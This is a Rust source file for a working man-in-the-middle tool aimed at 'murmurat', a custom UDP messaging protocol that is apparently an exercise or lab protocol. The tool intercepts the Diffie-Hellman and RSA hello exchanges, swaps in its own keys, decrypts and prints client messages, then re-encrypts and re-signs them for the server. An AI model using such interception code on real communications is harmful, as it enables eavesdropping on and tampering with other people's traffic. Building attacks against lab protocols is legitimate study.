use bytes::{Bytes, BytesMut};
use clap::Parser;
use murmurat_core::coding::{Decode, Encode};
use murmurat_core::encryption::{EncryptedData, Session};
use murmurat_core::message::{DHMessage, DataMessage, HelloMessage};
use murmurat_core::{RsaAuthentication, encryption::Keypair, message::MurmuratMessage, protocol};
use num_bigint::BigUint;
use std::collections::HashMap;
use std::net::{Ipv4Addr, SocketAddr, SocketAddrV4};
use std::time::SystemTime;
use tokio::net::{ToSocketAddrs, UdpSocket};

const SERVER_ADDR: SocketAddr =
    SocketAddr::V4(SocketAddrV4::new(Ipv4Addr::new(122, 1, 192, 22), 4001));

#[derive(Debug)]
struct MitmSession {
    // Session with the client
    client_session: Session,

    server_session: Session,

    client_rsa_public: HashMap<protocol::RsaPublicKeyId, protocol::RsaPublic>,

    server_rsa_public: HashMap<protocol::RsaPublicKeyId, protocol::RsaPublic>,
}

pub struct MurmuratMitm {
    server_addr: SocketAddr,

    /// Socket to bind on
    socket: UdpSocket,

    /// Keypair for dh exchange
    keypair: Keypair,

    /// Rsa authentication keys
    rsa: RsaAuthentication,

    /// Current sessions
    sessions: HashMap<SocketAddr, MitmSession>,
}

impl MurmuratMitm {
    pub async fn new<T>(
        addr: T,
        server: SocketAddr,
        keypair: Keypair,
        rsa: RsaAuthentication,
    ) -> std::io::Result<Self>
    where
        T: ToSocketAddrs,
    {
        let socket = UdpSocket::bind(&addr).await?;
        Ok(Self {
            socket,
            server_addr: server,
            keypair,
            rsa,
            sessions: HashMap::default(),
        })
    }

    async fn handle_dh(&mut self, addr: SocketAddr, message: DHMessage) -> std::io::Result<()> {
        if addr == self.server_addr {
            panic!("Should not receive dh in here from server");
        }

        if self.sessions.contains_key(&addr) {
            panic!("Should not get dh when session established");
        }

        println!("[+] Got dh from client...");
        let client_public = BigUint::from_bytes_be(&message.dh_public);
        let client_session = self.keypair.session(&client_public);

        let dh_message = MurmuratMessage::DH(murmurat_core::message::DHMessage {
            dh_public: self.keypair.public(),
        });

        println!("[+] Forwarding to server");
        self.send_message(&dh_message, &self.server_addr).await?;

        let (_, MurmuratMessage::DH(dh_response)) = self.recv_message().await? else {
            panic!("should receive response from server")
        };

        let server_public = BigUint::from_bytes_be(&dh_response.dh_public);
        let server_session = self.keypair.session(&server_public);

        println!("[+] Forwarding to client");
        self.send_message(&dh_message, &addr).await?;

        let session = MitmSession {
            client_session,
            server_session,
            client_rsa_public: HashMap::default(),
            server_rsa_public: HashMap::default(),
        };

        self.sessions.insert(addr, session);
        println!("[+] Client session duplicated for {}", addr);

        Ok(())
    }

    async fn handle_hello(
        &mut self,
        addr: SocketAddr,
        message: HelloMessage,
    ) -> std::io::Result<()> {
        if addr == self.server_addr {
            panic!("Should not receive hello in here from server");
        }

        // setup session between client
        if let Some(session) = self.sessions.get_mut(&addr) {
            session
                .client_rsa_public
                .insert(message.pubkey_id, message.rsa_public);
        } else {
            panic!("Should have a session when performing hello {}", addr)
        };

        let hello_message = MurmuratMessage::Hello(murmurat_core::message::HelloMessage {
            pubkey_id: self.rsa.id,
            rsa_public: self.rsa.key_bytes,
        });

        // send to server
        self.send_message(&hello_message, &self.server_addr).await?;

        let (_, MurmuratMessage::Hello(hello_response)) = self.recv_message().await? else {
            panic!("should receive response from server")
        };

        if let Some(session) = self.sessions.get_mut(&addr) {
            session
                .server_rsa_public
                .insert(hello_response.pubkey_id, hello_response.rsa_public)
        } else {
            panic!("Should have a session when performing hello")
        };

        self.send_message(&hello_message, &addr).await?;

        Ok(())
    }

    async fn handle_data(&mut self, addr: SocketAddr, message: DataMessage) -> std::io::Result<()> {
        if addr == self.server_addr {
            todo!("Should be forwarded to correct session");
        }

        if let Some(session) = self.sessions.get(&addr) {
            let Some(public_key) = session.client_rsa_public.get(&message.public_key_id) else {
                panic!("No public key with identifier");
            };

            if !RsaAuthentication::verify(public_key, &message.data, &message.signature) {
                panic!("Signature not correct");
            }

            let encrypted = EncryptedData::new(message.data, message.nonce);
            let decrypted = encrypted.decrypt(&session.client_session);

            println!("intercepted [{}] => {}", addr, decrypted);

            let encrypted = EncryptedData::encrypt(&decrypted, &session.server_session);
            let signature = self.rsa.sign(&encrypted.data);

            let timestamp: u32 = SystemTime::now()
                .duration_since(SystemTime::UNIX_EPOCH)
                .unwrap()
                .as_secs() as u32;

            // Create a DataMessage from the input message
            let data_message = MurmuratMessage::Data(murmurat_core::message::DataMessage {
                length: decrypted.len() as u16,
                nonce: encrypted.nonce[0],
                timestamp,
                data: encrypted.data.clone(),
                public_key_id: self.rsa.id,
                signature,
            });

            self.send_message(&data_message, &self.server_addr).await?;
        } else {
            panic!("Couldn't decrypt data...no session")
        }

        Ok(())
    }

    async fn handle_message(
        &mut self,
        addr: SocketAddr,
        message: MurmuratMessage,
    ) -> std::io::Result<()> {
        match message {
            MurmuratMessage::DH(message) => self.handle_dh(addr, message).await?,
            MurmuratMessage::Hello(message) => self.handle_hello(addr, message).await?,
            MurmuratMessage::Data(message) => self.handle_data(addr, message).await?,
        }

        Ok(())
    }

    async fn recv_message(&self) -> std::io::Result<(SocketAddr, MurmuratMessage)> {
        let mut buf = [0u8; 2048];
        let (_, addr) = self.socket.recv_from(&mut buf).await?;
        let mut buf = Bytes::copy_from_slice(buf.as_slice());
        Ok((
            addr,
            MurmuratMessage::decode(&mut buf).expect("failed to decode message"),
        ))
    }

    async fn send_message<T, A>(&self, message: &T, addr: &A) -> std::io::Result<()>
    where
        T: Encode,
        A: ToSocketAddrs,
    {
        let mut buffer = Vec::new();
        message.encode(&mut buffer).unwrap();
        self.socket.send_to(&buffer, addr).await?;
        Ok(())
    }

    async fn run(&mut self) -> std::io::Result<()> {
        while let Ok((addr, message)) = self.recv_message().await {
            self.handle_message(addr, message).await?;
        }

        Ok(())
    }
}

#[derive(Parser)]
struct Cli {
    #[clap(long, default_value = "127.0.0.1:1403")]
    addr: std::net::SocketAddr,

    #[clap(long, default_value = "127.0.0.1:1403")]
    server: std::net::SocketAddr,
}

#[tokio::main]
async fn main() -> std::io::Result<()> {
    let args = Cli::parse();

    let keypair = Keypair::generate_random();
    let rsa = RsaAuthentication::generate_random();

    let mut mitm = MurmuratMitm::new(args.addr, args.server, keypair, rsa).await?;
    println!("[+] MITM running...");
    mitm.run().await?;

    Ok(())
}
